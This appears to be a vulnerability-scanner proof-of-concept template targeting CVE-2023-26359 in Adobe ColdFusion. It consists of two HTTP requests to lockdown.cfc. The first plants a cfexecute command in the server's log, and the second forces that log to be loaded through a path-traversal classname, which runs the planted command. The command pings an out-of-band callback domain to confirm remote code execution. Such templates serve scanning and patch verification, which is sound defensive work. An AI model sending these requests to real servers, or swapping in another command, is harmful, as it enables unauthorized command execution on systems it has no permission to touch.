name: poc-yaml-adobe-coldfusion-deserialization-cve-2023-26359
binding: 2aac9132-2f76-4100-8c8f-9dc67a729489
manual: true
detail:
    author: chaitin
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            method: POST
            path: /CFIDE/lockdown/lockdown.cfc?method=x&_cfclient=true
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: argumentCollection={x<cfexecute name='ping' arguments='-nc 1 {{reverseDomain}}'/>
        expression: response.status == 200
    r1:
        request:
            method: POST
            path: /CFIDE/lockdown/lockdown.cfc?method=x&_cfclient=true
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: argumentCollection={"_metadata":{"classname":"/../logs/coldfusion-out.log"}}
        expression: reverse.wait(5)
expression: r0() && r1()
